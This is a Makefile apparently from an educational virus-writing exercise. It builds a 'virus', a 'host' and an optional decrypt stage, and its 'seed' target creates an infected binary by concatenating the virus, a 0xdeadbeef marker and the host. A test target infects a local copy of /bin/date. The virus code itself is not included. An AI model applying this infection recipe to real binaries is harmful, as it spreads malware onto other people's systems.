CFLAGS=-std=c11 -Wall -Wextra -g -DDEBUG

all: host virus seed

host: host.c

virus: virus.c vhlpr.c

decrypt: decrypt.c vhlpr.c -lcrypt


# cc -c $^ -o $@ -lcrypt


# Infect the host binary with the virus
seed: virus host
	cp virus seed
	printf '\xde\xad\xbe\xef' >> seed
	cat host >> seed

# seed: decrypt virus host
# 	cp decrypt seed
# 	printf '\xba\x5e\xba\x11' >> seed
# 	cat virus >> seed
# 	printf '\xde\xad\xbe\xef' >> seed
# 	cat host >> seed

test: seed
	cp /bin/date .
	chmod -x date
	./seed date
	chmod +x date
	./date

clean:
	rm -f host vhlpr.o virus decrypt seed
